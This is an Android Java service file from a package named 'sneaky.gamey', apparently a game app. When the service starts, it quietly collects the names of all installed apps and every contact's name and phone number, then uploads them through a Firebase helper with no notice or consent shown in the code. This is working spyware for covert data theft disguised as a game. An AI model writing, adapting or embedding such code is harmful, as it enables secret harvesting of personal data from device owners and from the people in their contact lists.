package com.sneaky.gamey.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract;

import androidx.annotation.Nullable;

import com.sneaky.gamey.database.Firebase;

import java.util.ArrayList;
import java.util.List;

public class MainService extends Service {

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ArrayList<String> data = getInstalledApplications();
        Firebase.sendData(data);
        data = getContactList();
        Firebase.sendData(data);

        return super.onStartCommand(intent, flags, startId);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private ArrayList<String> getInstalledApplications() {
        final PackageManager pm = getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        ArrayList<String> packageNames = new ArrayList<String>();
        for (ApplicationInfo packageInfo : packages) {
            packageNames.add(packageInfo.packageName);
        }
        return packageNames;
    }
    private ArrayList<String> getContactList() {
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null);
        ArrayList<String> contacts = new ArrayList<String>();

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.add("name: " + name + " number: " + phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if(cur != null){
            cur.close();
        }
        return contacts;
    }
}
